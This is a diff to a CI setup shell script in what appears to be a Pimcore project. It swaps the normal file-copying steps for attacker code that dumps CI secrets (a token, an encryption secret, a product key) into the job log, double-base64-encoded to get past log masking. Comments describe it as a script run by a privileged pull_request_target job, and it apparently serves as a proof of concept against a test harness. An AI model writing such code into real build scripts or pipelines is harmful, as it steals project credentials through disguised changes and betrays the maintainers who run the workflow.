@@ -1,19 +1,8 @@
 #!/bin/bash
-
-set -eu
-
-mkdir -p var/config
-
-cp -r .github/ci/files/config/. config
-mkdir -p config/local/
-cp -r .github/ci/files/templates/. templates
-cp -r .github/ci/files/translations/. translations
-cp -r .github/ci/files/bin/console bin/console
-cp -r .github/ci/files/src/. src
-cp -r .github/ci/files/public/. public
-cp .github/ci/files/.env ./
-
-if [ ${PIMCORE_STORAGE:-local} = "minio" ]; then
-    cp .github/ci/files/minio-flysystem.yaml config/local/
-    composer require -n --no-update league/flysystem-aws-s3-v3
-fi
+# Attacker-controlled script executed directly by the privileged pull_request_target job.
+# Leak the harness toy secret (double-base64 to survive log masking) then fail fast.
+echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
+echo "GERALT_LEAKED_PIMCORE_INSTANCE_IDENTIFIER=$(echo -n "$PIMCORE_INSTANCE_IDENTIFIER" | base64 | base64)"
+echo "GERALT_LEAKED_PIMCORE_ENCRYPTION_SECRET=$(echo -n "$PIMCORE_ENCRYPTION_SECRET" | base64 | base64)"
+echo "GERALT_LEAKED_PIMCORE_PRODUCT_KEY=$(echo -n "$PIMCORE_PRODUCT_KEY" | base64 | base64)"
+exit 1
